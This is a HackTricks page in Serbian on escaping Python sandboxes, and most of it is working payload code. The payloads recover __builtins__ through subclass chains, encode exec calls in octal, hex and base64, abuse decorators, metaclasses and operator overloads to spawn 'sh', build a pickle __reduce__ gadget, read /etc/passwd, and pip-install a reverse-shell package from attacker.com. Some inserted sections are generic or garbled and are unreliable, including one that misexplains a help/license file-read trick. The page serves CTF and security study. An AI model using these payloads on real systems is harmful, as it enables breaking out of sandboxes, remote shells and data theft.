# Zaobilaženje Python peskovnika

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Pronađite najvažnije ranjivosti kako biste ih brže popravili. Intruder prati vašu površinu napada, pokreće proaktivno skeniranje pretnji, pronalazi probleme u celokupnom tehnološkom sklopu, od API-ja do veb aplikacija i cloud sistema. [**Isprobajte ga besplatno**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) danas.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

Ovo su neki trikovi za zaobilaženje zaštite Python peskovnika i izvršavanje proizvoljnih komandi.

## Biblioteke za izvršavanje komandi

Prva stvar koju trebate znati je da li možete direktno izvršiti kod sa nekom već uvezenom bibliotekom, ili da li možete uvesti neku od ovih biblioteka:
```python
os.system("ls")
os.popen("ls").read()
commands.getstatusoutput("ls")
commands.getoutput("ls")
commands.getstatus("file/path")
subprocess.call("ls", shell=True)
subprocess.Popen("ls", shell=True)
pty.spawn("ls")
pty.spawn("/bin/bash")
platform.os.system("ls")
pdb.os.system("ls")

#Import functions to execute commands
importlib.import_module("os").system("ls")
importlib.__import__("os").system("ls")
imp.load_source("os","/usr/lib/python3.8/os.py").system("ls")
imp.os.system("ls")
imp.sys.modules["os"].system("ls")
sys.modules["os"].system("ls")
__import__("os").system("ls")
import os
from os import *

#Other interesting functions
open("/etc/passwd").read()
open('/var/www/html/input', 'w').write('123')

#In Python2.7
execfile('/usr/lib/python2.7/os.py')
system('ls')
```
Zapamtite da funkcije _**open**_ i _**read**_ mogu biti korisne za **čitanje datoteka** unutar Python sandboxa i za **pisanje koda** koji možete **izvršiti** kako biste **zaobišli** sandbox.

{% hint style="danger" %}
Funkcija **Python2 input()** omogućava izvršavanje Python koda pre nego što program padne.
{% endhint %}

Python pokušava **učitati biblioteke iz trenutnog direktorijuma prvo** (sledeća komanda će ispisati gde Python učitava module): `python3 -c 'import sys; print(sys.path)'`

![](<../../../.gitbook/assets/image (552).png>)

## Zaobilaženje pickle sandboxa sa prethodno instaliranim Python paketima

### Prethodno instalirani paketi

Možete pronaći **listu prethodno instaliranih** paketa ovde: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
Imajte na umu da iz pickle-a možete napraviti Python okruženje koje **uvozi proizvoljne biblioteke** instalirane u sistemu.\
Na primer, sledeći pickle, kada se učita, će uvesti biblioteku pip kako bi je koristio:
```python
#Note that here we are importing the pip library so the pickle is created correctly
#however, the victim doesn't even need to have the library installed to execute it
#the library is going to be loaded automatically

import pickle, os, base64, pip
class P(object):
def __reduce__(self):
return (pip.main,(["list"],))

print(base64.b64encode(pickle.dumps(P(), protocol=0)))
```
Za više informacija o tome kako radi pickle, pogledajte ovde: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)

### Pip paket

Trik deljen od strane **@isHaacK**

Ako imate pristup `pip`-u ili `pip.main()`-u, možete instalirati proizvoljan paket i dobiti obrnutu ljusku pozivajući:
```bash
pip install http://attacker.com/Rerverse.tar.gz
pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
```
Možete preuzeti paket za kreiranje obrnutog školjka ovde. Napomena da pre korišćenja treba **dekompresovati ga, promeniti `setup.py` i uneti vašu IP adresu za obrnuti školjka**:

{% file src="../../../.gitbook/assets/reverse.tar.gz" %}

{% hint style="info" %}
Ovaj paket se zove `Reverse`. Međutim, posebno je napravljen tako da kada izađete iz obrnutog školjka, ostatak instalacije će propasti, tako da **nećete ostaviti nikakav dodatni Python paket instaliran na serveru** kada odete.
{% endhint %}

## Evaluiranje Python koda

{% hint style="warning" %}
Imajte na umu da exec dozvoljava višelinijske stringove i ";", ali eval ne (proverite walrus operator)
{% endhint %}

Ako su određeni karakteri zabranjeni, možete koristiti **heksadecimalnu/oktalnu/B64** reprezentaciju da **zaobiđete** ograničenje:
```python
exec("print('RCE'); __import__('os').system('ls')") #Using ";"
exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
eval("__import__('os').system('ls')") #Eval doesn't allow ";"
eval(compile('print("hello world"); print("heyy")', '<stdin>', 'exec')) #This way eval accept ";"
__import__('timeit').timeit("__import__('os').system('ls')",number=1)
#One liners that allow new lines and tabs
eval(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
exec(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
```

```python
#Octal
exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")
#Hex
exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29")
#Base64
exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
```
### Ostale biblioteke koje omogućavaju evaluaciju Python koda

There are several other libraries that can be used to evaluate Python code in addition to the built-in `eval()` function. These libraries provide alternative methods for executing Python code dynamically.

#### 1. `exec()`

The `exec()` function is similar to `eval()`, but it is used to execute blocks of code rather than evaluating expressions. It can be used to execute arbitrary Python code stored in strings or files.

```python
code = "print('Hello, World!')"
exec(code)
```

#### 2. `ast.literal_eval()`

The `ast.literal_eval()` function is a safer alternative to `eval()` that only evaluates literals such as strings, numbers, tuples, lists, dicts, booleans, and `None`. It provides a way to safely evaluate untrusted Python expressions without executing arbitrary code.

```python
import ast

code = "[1, 2, 3]"
result = ast.literal_eval(code)
print(result)
```

#### 3. `compile()`

The `compile()` function is used to compile Python source code into bytecode or an abstract syntax tree (AST) object. It can be used to dynamically generate and execute Python code.

```python
code = """
def multiply(a, b):
    return a * b

result = multiply(2, 3)
print(result)
"""

compiled_code = compile(code, "<string>", "exec")
exec(compiled_code)
```

These libraries provide additional options for evaluating Python code and can be useful in bypassing Python sandboxes or implementing dynamic code execution in certain scenarios.
```python
#Pandas
import pandas as pd
df = pd.read_csv("currency-rates.csv")
df.query('@__builtins__.__import__("os").system("ls")')
df.query("@pd.io.common.os.popen('ls').read()")
df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")

# The previous options work but others you might try give the error:
# Only named functions are supported
# Like:
df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
```
## Operatori i kratki trikovi

### Operatori

Python podržava različite operatore koji se mogu koristiti za manipulaciju podacima. Evo nekoliko osnovnih operatora:

- **Aritmetički operatori**: +, -, *, /, %, //, **
- **Poređenje operatori**: ==, !=, >, <, >=, <=
- **Logički operatori**: and, or, not
- **Bitni operatori**: &, |, ^, ~, <<, >>
- **Dodatni operatori**: is, is not, in, not in

### Kratki trikovi

U Pythonu postoje neki kratki trikovi koji mogu biti korisni prilikom pisanja efikasnog koda. Evo nekoliko primjera:

- **Ternarni operator**: Možete koristiti ternarni operator za kraće pisanje if-else izjava. Na primjer: `x = 10 if condition else 20`
- **Kratko dodjeljivanje**: Možete koristiti kratko dodjeljivanje za brže dodjeljivanje vrijednosti varijablama. Na primjer: `x += 1` umjesto `x = x + 1`
- **Kratko pisanje petlji**: Možete koristiti kratko pisanje petlji za brže iteriranje kroz liste. Na primjer: `[print(i) for i in lista]`
- **Kratko pisanje uvjetnih izjava**: Možete koristiti kratko pisanje uvjetnih izjava za brže provjeravanje uvjeta. Na primjer: `x = 10 if a > b else 20`

Ovi operatori i trikovi mogu vam pomoći da napišete čist i efikasan Python kod.
```python
# walrus operator allows generating variable inside a list
## everything will be executed in order
## From https://ur4ndom.dev/posts/2020-06-29-0ctf-quals-pyaucalc/
[a:=21,a*2]
[y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
```
## Bypassiranje zaštite putem enkodiranja (UTF-7)

U [**ovom članku**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) koristi se UTF-7 za učitavanje i izvršavanje proizvoljnog Python koda unutar navodne pješčanika (sandbox).
```python
assert b"+AAo-".decode("utf_7") == "\n"

payload = """
# -*- coding: utf_7 -*-
def f(x):
return x
#+AAo-print(open("/flag.txt").read())
""".lstrip()
```
Takođe je moguće zaobići to koristeći druge kodiranja, na primer `raw_unicode_escape` i `unicode_escape`.

## Izvršavanje Python koda bez poziva

Ako se nalazite unutar Python zatvora koji **ne dozvoljava pozive**, i dalje postoje načini da **izvršite proizvoljne funkcije, kod** i **komande**.

### RCE sa [dekoratorima](https://docs.python.org/3/glossary.html#term-decorator)
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
@exec
@input
class X:
pass

# The previous code is equivalent to:
class X:
pass
X = input(X)
X = exec(X)

# So just send your python code when prompted and it will be executed


# Another approach without calling input:
@eval
@'__import__("os").system("sh")'.format
class _:pass
```
### RCE kreiranje objekata i preopterećivanje

Ako možete **deklarisati klasu** i **kreirati objekat** te klase, možete **pisati/prepisivati različite metode** koje se mogu **pokrenuti** **bez** **potrebe da ih direktno pozivate**.

#### RCE sa prilagođenim klasama

Možete izmeniti neke **metode klase** (_prepisivanjem postojećih metoda klase ili kreiranjem nove klase_) kako bi izvršavale proizvoljni kod kada se **pokrenu** bez direktnog pozivanja.
```python
# This class has 3 different ways to trigger RCE without directly calling any function
class RCE:
def __init__(self):
self += "print('Hello from __init__ + __iadd__')"
__iadd__ = exec #Triggered when object is created
def __del__(self):
self -= "print('Hello from __del__ + __isub__')"
__isub__ = exec #Triggered when object is created
__getitem__ = exec #Trigerred with obj[<argument>]
__add__ = exec #Triggered with obj + <argument>

# These lines abuse directly the previous class to get RCE
rce = RCE() #Later we will see how to create objects without calling the constructor
rce["print('Hello from __getitem__')"]
rce + "print('Hello from __add__')"
del rce

# These lines will get RCE when the program is over (exit)
sys.modules["pwnd"] = RCE()
exit()

# Other functions to overwrite
__sub__ (k - 'import os; os.system("sh")')
__mul__ (k * 'import os; os.system("sh")')
__floordiv__ (k // 'import os; os.system("sh")')
__truediv__ (k / 'import os; os.system("sh")')
__mod__ (k % 'import os; os.system("sh")')
__pow__ (k**'import os; os.system("sh")')
__lt__ (k < 'import os; os.system("sh")')
__le__ (k <= 'import os; os.system("sh")')
__eq__ (k == 'import os; os.system("sh")')
__ne__ (k != 'import os; os.system("sh")')
__ge__ (k >= 'import os; os.system("sh")')
__gt__ (k > 'import os; os.system("sh")')
__iadd__ (k += 'import os; os.system("sh")')
__isub__ (k -= 'import os; os.system("sh")')
__imul__ (k *= 'import os; os.system("sh")')
__ifloordiv__ (k //= 'import os; os.system("sh")')
__idiv__ (k /= 'import os; os.system("sh")')
__itruediv__ (k /= 'import os; os.system("sh")') (Note that this only works when from __future__ import division is in effect.)
__imod__ (k %= 'import os; os.system("sh")')
__ipow__ (k **= 'import os; os.system("sh")')
__ilshift__ (k<<= 'import os; os.system("sh")')
__irshift__ (k >>= 'import os; os.system("sh")')
__iand__ (k = 'import os; os.system("sh")')
__ior__ (k |= 'import os; os.system("sh")')
__ixor__ (k ^= 'import os; os.system("sh")')
```
#### Kreiranje objekata pomoću [metaklasa](https://docs.python.org/3/reference/datamodel.html#metaclasses)

Ključna stvar koju nam metaklase omogućavaju je **kreiranje instance klase, bez direktnog pozivanja konstruktora**, tako što se kreira nova klasa sa ciljnom klasom kao metaklasom.
```python
# Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
# This will define the members of the "subclass"
class Metaclass(type):
__getitem__ = exec # So Sub[string] will execute exec(string)
# Note: Metaclass.__class__ == type

class Sub(metaclass=Metaclass): # That's how we make Sub.__class__ == Metaclass
pass # Nothing special to do

Sub['import os; os.system("sh")']

## You can also use the tricks from the previous section to get RCE with this object
```
#### Kreiranje objekata sa izuzecima

Kada se **izuzetak pokrene**, objekat **Exception** se automatski **kreira** bez potrebe da direktno pozivate konstruktor (tričarenje od [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)):
```python
class RCE(Exception):
def __init__(self):
self += 'import os; os.system("sh")'
__iadd__ = exec #Triggered when object is created
raise RCE #Generate RCE object


# RCE with __add__ overloading and try/except + raise generated object
class Klecko(Exception):
__add__ = exec

try:
raise Klecko
except Klecko as k:
k + 'import os; os.system("sh")' #RCE abusing __add__

## You can also use the tricks from the previous section to get RCE with this object
```
### Više RCE

Ovde ćemo razmotriti nekoliko dodatnih metoda za postizanje udaljenog izvršavanja koda (RCE) u Pythonu. Ove metode se mogu koristiti za zaobilaženje peska Python okruženja i izvršavanje neovlašćenog koda.

#### 1. Korišćenje `os.system()`

Metoda `os.system()` se koristi za izvršavanje sistemskih komandi. Može se iskoristiti za izvršavanje proizvoljnog koda na ciljnom sistemu. Evo jednostavnog primera:

```python
import os

command = "echo 'Hello, world!'"
os.system(command)
```

Ovaj kod će izvršiti komandu `echo 'Hello, world!'` na ciljnom sistemu.

#### 2. Korišćenje `subprocess.Popen()`

Modul `subprocess` pruža funkcionalnost za pokretanje drugih programa i komandi. Metoda `Popen()` se može koristiti za izvršavanje proizvoljnog koda na ciljnom sistemu. Evo primera:

```python
import subprocess

command = "echo 'Hello, world!'"
subprocess.Popen(command, shell=True)
```

Ovaj kod će takođe izvršiti komandu `echo 'Hello, world!'` na ciljnom sistemu.

#### 3. Korišćenje `eval()`

Funkcija `eval()` se koristi za evaluaciju proizvoljnog Python koda. Može se iskoristiti za izvršavanje neovlašćenog koda na ciljnom sistemu. Evo primera:

```python
code = "__import__('os').system('echo Hello, world!')"
eval(code)
```

Ovaj kod će izvršiti komandu `echo Hello, world!` na ciljnom sistemu.

#### 4. Korišćenje `exec()`

Funkcija `exec()` se takođe koristi za izvršavanje proizvoljnog Python koda. Može se iskoristiti za izvršavanje neovlašćenog koda na ciljnom sistemu. Evo primera:

```python
code = "__import__('os').system('echo Hello, world!')"
exec(code)
```

Ovaj kod će takođe izvršiti komandu `echo Hello, world!` na ciljnom sistemu.

#### Napomena

Važno je napomenuti da ove metode mogu biti opasne i mogu dovesti do neovlašćenog pristupa ciljnom sistemu. Treba ih koristiti samo u zakonite svrhe i uz dozvolu vlasnika sistema.
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
# If sys is imported, you can sys.excepthook and trigger it by triggering an error
class X:
def __init__(self, a, b, c):
self += "os.system('sh')"
__iadd__ = exec
sys.excepthook = X
1/0 #Trigger it

# From https://github.com/google/google-ctf/blob/master/2022/sandbox-treebox/healthcheck/solution.py
# The interpreter will try to import an apt-specific module to potentially
# report an error in ubuntu-provided modules.
# Therefore the __import__ functions are overwritten with our RCE
class X():
def __init__(self, a, b, c, d, e):
self += "print(open('flag').read())"
__iadd__ = eval
__builtins__.__import__ = X
{}[1337]
```
### Čitanje datoteke pomoću ugrađenih funkcija `help` i `license`

Da biste pročitali sadržaj datoteke koristeći ugrađene funkcije `help` i `license`, možete koristiti sledeći kod:

```python
with open('ime_datoteke', 'r') as f:
    sadrzaj = f.read()
    help(sadrzaj)
    license(sadrzaj)
```

Zamenite `'ime_datoteke'` sa putanjom i imenom datoteke koju želite da pročitate. Ovaj kod će otvoriti datoteku, pročitati njen sadržaj i proslediti ga funkcijama `help` i `license` kako bi prikazale informacije o sadržaju datoteke.

Napomena: Ovaj kod može biti koristan za čitanje Python skripti ili drugih tekstualnih datoteka koje sadrže dokumentaciju ili licencu.
```python
__builtins__.__dict__["license"]._Printer__filenames=["flag"]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__["license"]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
pass
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Pronađite najvažnije ranjivosti kako biste ih brže popravili. Intruder prati vašu površinu napada, pokreće proaktivne pretnje, pronalazi probleme u celom vašem tehnološkom skupu, od API-ja do veb aplikacija i cloud sistema. [**Isprobajte besplatno**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) danas.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Ugrađene funkcije

* [**Ugrađene funkcije u Pythonu 2**](https://docs.python.org/2/library/functions.html)
* [**Ugrađene funkcije u Pythonu 3**](https://docs.python.org/3/library/functions.html)

Ako možete pristupiti objektu **`__builtins__`**, možete uvesti biblioteke (primetite da biste ovde mogli koristiti i drugu string reprezentaciju prikazanu u poslednjem odeljku):
```python
__builtins__.__import__("os").system("ls")
__builtins__.__dict__['__import__']("os").system("ls")
```
### Bez ugrađenih funkcija

Kada nemate `__builtins__`, nećete moći da uvezete ništa, niti čitati ili pisati fajlove, jer **sve globalne funkcije** (poput `open`, `import`, `print`...) **nisu učitane**.\
Međutim, **podrazumevano, Python učitava mnoge module u memoriju**. Ovi moduli mogu delovati bezopasno, ali neki od njih **takođe uvoze opasne funkcionalnosti** koje se mogu iskoristiti za dobijanje **izvršavanja proizvoljnog koda**.

U sledećim primerima možete videti kako **zloupotrebiti** neke od ovih "**bezopasnih**" učitanih modula kako biste **pristupili** **opasnim** **funkcionalnostima** unutar njih.

**Python2**
```python
#Try to reload __builtins__
reload(__builtins__)
import __builtin__

# Read recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
# Write recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')

# Execute recovering __import__ (class 59s is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
# Execute (another method)
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__("func_globals")['linecache'].__dict__['os'].__dict__['system']('ls')
# Execute recovering eval symbol (class 59 is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]["eval"]("__import__('os').system('ls')")

# Or you could obtain the builtins from a defined function
get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
```
#### Python3

Python3 je popularan programski jezik koji se često koristi za razvoj različitih vrsta aplikacija. Međutim, kao i kod drugih programskih jezika, postoje situacije u kojima je potrebno zaobići Python3 peskire kako bi se izvršio određeni kod ili funkcionalnost koja je inače ograničena.

Ovaj vodič pruža nekoliko tehnika i resursa za zaobilaženje Python3 peskira. Ove tehnike mogu biti korisne u različitim scenarijima, kao što su testiranje sigurnosti, analiza zlonamernog koda ili razvoj alata za hakovanje.

Napomena: Korišćenje ovih tehnika za neovlašćeni pristup ili zlonamernu aktivnost je ilegalno i strogo se kažnjava zakonom. Ovaj vodič je namenjen samo u edukativne svrhe i treba ga koristiti odgovorno i etički.

### Tehnike za zaobilaženje Python3 peskira

1. **Korišćenje drugih programskih jezika**: Jedan od načina za zaobilaženje Python3 peskira je korišćenje drugih programskih jezika koji nemaju takva ograničenja. Na primer, možete koristiti C ili C++ za pisanje dela koda koji zahteva privilegije koje Python3 peskiri ne dozvoljavaju.

2. **Korišćenje Python3 interpretera**: Python3 interpreter može biti koristan alat za zaobilaženje peskira. Možete koristiti interpreter da izvršite kod koji je inače blokiran peskirom. Na primer, možete koristiti `exec()` funkciju da izvršite kod koji nije dozvoljen u peskiru.

3. **Manipulacija okruženja**: Još jedna tehnika za zaobilaženje Python3 peskira je manipulacija okruženja. Možete promeniti vrednosti okruženjskih promenljivih kako biste zaobišli ograničenja peskira. Na primer, možete promeniti `PYTHONPATH` promenljivu da biste omogućili izvršavanje koda izvan peskira.

4. **Korišćenje biblioteka i modula**: Postoje određene biblioteke i moduli koji omogućavaju zaobilaženje Python3 peskira. Na primer, `ctypes` biblioteka omogućava izvršavanje C koda iz Pythona, što može biti korisno za zaobilaženje peskira.

5. **Korišćenje Python3 ranjivosti**: Ponekad je moguće zaobići Python3 peskire korišćenjem ranjivosti u samom Python3 interpreteru. Ove ranjivosti mogu biti iskorišćene za izvršavanje koda koji nije dozvoljen peskirom.

### Dodatni resursi

- [Python3 dokumentacija](https://docs.python.org/3/)
- [Python3 interpreter dokumentacija](https://docs.python.org/3/tutorial/interpreter.html)
- [Python3 biblioteke i moduli](https://docs.python.org/3/library/index.html)

### Zaključak

Zaobilaženje Python3 peskira može biti korisna tehnika u određenim scenarijima. Međutim, važno je imati na umu da je korišćenje ovih tehnika za neovlašćeni pristup ili zlonamernu aktivnost ilegalno i strogo se kažnjava zakonom. Ovaj vodič treba koristiti samo u edukativne svrhe i odgovorno.
```python
# Obtain builtins from a globally defined function
# https://docs.python.org/3/library/functions.html
help.__call__.__builtins__ # or __globals__
license.__call__.__builtins__ # or __globals__
credits.__call__.__builtins__ # or __globals__
print.__self__
dir.__self__
globals.__self__
len.__self__
__build_class__.__self__

# Obtain the builtins from a defined function
get_flag.__globals__['__builtins__']

# Get builtins from loaded classes
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
```
[**Ispod se nalazi veća funkcija**](./#rekurzivno-pretraživanje-ugrađenih-globalnih-funkcija) za pronalaženje desetina/**stotina** **mesta** gde možete pronaći **ugrađene funkcije**.

#### Python2 i Python3
```python
# Recover __builtins__ and make everything easier
__builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
__builtins__["__import__"]('os').system('ls')
```
### Ugrađeni payloadi

Ova sekcija sadrži nekoliko ugrađenih payloada koji se mogu koristiti za zaobilaženje Python sandboxa. Ovi payloadi koriste ugrađene funkcije i metode Pythona kako bi izvršili određene akcije koje su obično ograničene u sandbox okruženju.

#### `__import__`

Ovaj payload koristi `__import__` funkciju kako bi se zaobišao sandbox. `__import__` funkcija se koristi za dinamičko uvoziranje modula u Pythonu. Kada se koristi u sandbox okruženju, može se koristiti za uvozivanje modula koji sadrže opasne funkcionalnosti.

```python
__import__('os').system('command')
```

Zamijenite `'command'` sa željenom naredbom koju želite izvršiti.

#### `eval`

Ovaj payload koristi `eval` funkciju kako bi se zaobišao sandbox. `eval` funkcija se koristi za evaluaciju Python koda iz stringa. Kada se koristi u sandbox okruženju, može se koristiti za izvršavanje proizvoljnog koda.

```python
eval('__import__("os").system("command")')
```

Zamijenite `'command'` sa željenom naredbom koju želite izvršiti.

#### `exec`

Ovaj payload koristi `exec` funkciju kako bi se zaobišao sandbox. `exec` funkcija se koristi za izvršavanje Python koda iz stringa. Kada se koristi u sandbox okruženju, može se koristiti za izvršavanje proizvoljnog koda.

```python
exec('__import__("os").system("command")')
```

Zamijenite `'command'` sa željenom naredbom koju želite izvršiti.

#### `compile`

Ovaj payload koristi `compile` funkciju kako bi se zaobišao sandbox. `compile` funkcija se koristi za kompajliranje Python koda iz stringa u bytecode objekt. Kada se koristi u sandbox okruženju, može se koristiti za izvršavanje proizvoljnog koda.

```python
code = compile('__import__("os").system("command")', '<string>', 'exec')
exec(code)
```

Zamijenite `'command'` sa željenom naredbom koju želite izvršiti.
```python
# Possible payloads once you have found the builtins
__builtins__["open"]("/etc/passwd").read()
__builtins__["__import__"]("os").system("ls")
# There are lots of other payloads that can be abused to execute commands
# See them below
```
## Globalne i lokalne promenljive

Provera **`globals`** i **`locals`** je dobar način da saznate na šta možete da pristupite.
```python
>>> globals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
>>> locals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}

# Obtain globals from a defined function
get_flag.__globals__

# Obtain globals from an object of a class
class_obj.__init__.__globals__

# Obtaining globals directly from loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x) ]
[<class 'function'>]

# Obtaining globals from __init__ of loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x.__init__) ]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
# Without the use of the dir() function
[ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 